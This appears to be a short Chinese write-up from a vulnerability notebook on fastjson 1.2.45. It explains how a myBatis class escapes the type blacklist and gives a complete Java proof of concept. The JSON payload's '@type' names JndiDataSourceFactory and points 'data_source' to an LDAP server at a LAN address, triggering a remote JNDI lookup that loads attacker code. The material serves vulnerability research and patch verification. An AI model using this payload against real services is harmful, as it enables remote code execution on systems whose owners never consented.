.. _1.2.45:

版本1.2.45
=============


漏洞说明
----------

1.2.44版本开始，将自定义类型以字符"["开头的类型名称也屏蔽了，之前的POC失效，JdbcRowSetImpl类不能再使用。如果服务器有使用myBatis包，则可以利用其中的org.apache.ibatis.datasource.jndi.JndiDataSourceFactory类，实现同样的远程调用效果。即该类不在屏蔽范围内，也不在黑名单中，但在系统环境中包含，且能实现远程调用。同样需要设置autoTypeSupport为true。实际测试myBatis的5.11及以前版本均支持该漏洞。


调试
-------

.. figure:: images/1.2.45/ParserConfig-checkAutoType45-1.png

   ParserConfig.checkAutoType

   如果以\"[\"开头，则直接报异常退出。所以 :ref:`1.2.43` 版本的POC不在适用。本次版本所用的类型不在黑名单中，所以可以绕过黑名单，直接将类型返回。


POC
------

.. code-block:: xml
   :caption: pom.xml

   <!-- 增加以下内容 -->
   <dependency>
       <groupId>org.mybatis</groupId>
       <artifactId>mybatis</artifactId>
       <version>3.5.11</version>
   </dependency>   

.. code-block:: java

   package org.example;

   import com.alibaba.fastjson.JSON;
   import com.alibaba.fastjson.parser.ParserConfig;
   
   public class Main {
       public static void main(String[] args) {
   
           String s = "{\"@type\":\"org.apache.ibatis.datasource.jndi.JndiDataSourceFactory\",\"properties\":{\"data_source\":\"ldap://192.168.0.102:1389/ExTest\"}}";
           ParserConfig.getGlobalInstance().setAutoTypeSupport(true);
           Object contentValue = JSON.parseObject(s);
       }
   }
